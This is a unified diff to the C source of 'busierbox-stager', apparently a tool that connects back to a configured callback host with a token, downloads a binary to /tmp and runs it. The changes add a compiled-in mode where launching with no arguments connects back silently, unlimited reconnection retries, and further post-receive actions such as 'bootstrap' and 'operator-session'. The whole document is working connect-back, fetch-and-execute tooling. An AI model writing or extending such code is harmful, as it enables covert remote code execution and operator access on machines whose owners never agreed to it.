@@ -47,8 +47,14 @@
 #ifndef BB_STAGER_OUTPUT_PATH
 #define BB_STAGER_OUTPUT_PATH "/tmp/busierbox-full"
 #endif
+#ifndef BB_STAGER_ZERO_ARG_MODE
+#define BB_STAGER_ZERO_ARG_MODE "help"
+#endif
 #ifndef BB_STAGER_AUTO_EXEC
 #define BB_STAGER_AUTO_EXEC "doctor"
+#endif
+#ifndef BB_STAGER_POST_RECEIVE_ACTION
+#define BB_STAGER_POST_RECEIVE_ACTION BB_STAGER_AUTO_EXEC
 #endif
 
 #define PROTOCOL "busierbox-stager-v1"
@@ -74,9 +80,9 @@ static void usage(FILE *out)
     fprintf(out,
         "usage: busierbox-stager [survey --json]\n"
         "       busierbox-stager [--callback-host HOST --callback-port PORT --token TOKEN]\n"
-        "                         [--output PATH] [--auto-exec none|doctor|survey]\n"
-        "                         [--timeout SEC] [--retry-count N] [--retry-delay SEC]\n\n"
-        "With compiled callback defaults enabled, running with no arguments connects back automatically.\n"
+        "                         [--output PATH] [--auto-exec none|survey|doctor|callback|bootstrap|operator-session]\n"
+        "                         [--timeout SEC] [--retry-count N|-1] [--retry-delay SEC]\n\n"
+        "With zero-arg callback mode configured, running with no arguments connects back automatically.\n"
         "No persistence, daemonization, or background beaconing is performed.\n");
 }
 
@@ -590,11 +596,11 @@ static int callback_session(const struct opts *opts)
         fprintf(stderr, "stager: callback requires host, port, and token\n");
         return 2;
     }
-    for (attempt = 0; attempt < opts->retry_count; attempt++) {
+    for (attempt = 0; opts->retry_count < 0 || attempt < opts->retry_count; attempt++) {
         fd = connect_once(opts->host, opts->port, opts->timeout);
         if (fd >= 0)
             break;
-        if (attempt + 1 < opts->retry_count)
+        if (opts->retry_count < 0 || attempt + 1 < opts->retry_count)
             sleep((unsigned int)opts->retry_delay);
     }
     if (fd < 0) {
@@ -663,7 +669,7 @@ int main(int argc, char **argv)
     opts.port = BB_STAGER_CALLBACK_PORT;
     opts.token = BB_STAGER_TOKEN;
     opts.output_path = BB_STAGER_OUTPUT_PATH;
-    opts.auto_exec = BB_STAGER_AUTO_EXEC;
+    opts.auto_exec = BB_STAGER_POST_RECEIVE_ACTION;
     opts.timeout = BB_STAGER_CONNECT_TIMEOUT;
     opts.retry_count = BB_STAGER_RETRY_COUNT;
     opts.retry_delay = BB_STAGER_RETRY_DELAY;
@@ -672,6 +678,35 @@ int main(int argc, char **argv)
     if (argc > 1 && (streq(argv[1], "--help") || streq(argv[1], "-h"))) {
         usage(stdout);
         return 0;
+    }
+    if (argc == 1) {
+        if (streq(BB_STAGER_ZERO_ARG_MODE, "callback")) {
+            if (!opts.callback) {
+                fprintf(stderr, "stager: zero-arg callback requested but callback is disabled\n");
+                return 2;
+            }
+            if (opts.retry_count < 1)
+                opts.retry_count = 1;
+            if (opts.timeout < 1)
+                opts.timeout = 1;
+            signal(SIGPIPE, SIG_IGN);
+            return callback_session(&opts);
+        }
+        if (streq(BB_STAGER_ZERO_ARG_MODE, "survey")) {
+            char *s = survey_json();
+            if (!s)
+                return 1;
+            puts(s);
+            free(s);
+            return 0;
+        }
+        if (streq(BB_STAGER_ZERO_ARG_MODE, "help") || streq(BB_STAGER_ZERO_ARG_MODE, "menu")) {
+            usage(stdout);
+            return 0;
+        }
+        fprintf(stderr, "stager: zero-arg mode '%s' is not supported by the stager runtime yet\n", BB_STAGER_ZERO_ARG_MODE);
+        usage(stderr);
+        return 2;
     }
     if (argc > 2 && streq(argv[1], "survey") && streq(argv[2], "--json")) {
         char *s = survey_json();
@@ -704,10 +739,12 @@ int main(int argc, char **argv)
             return 2;
         }
     }
-    if (opts.retry_count < 1)
+    if (opts.retry_count == 0 || opts.retry_count < -1)
         opts.retry_count = 1;
     if (opts.timeout < 1)
         opts.timeout = 1;
+    if (opts.retry_delay < 0)
+        opts.retry_delay = 0;
     if (!opts.callback) {
         usage(stderr);
         return 2;
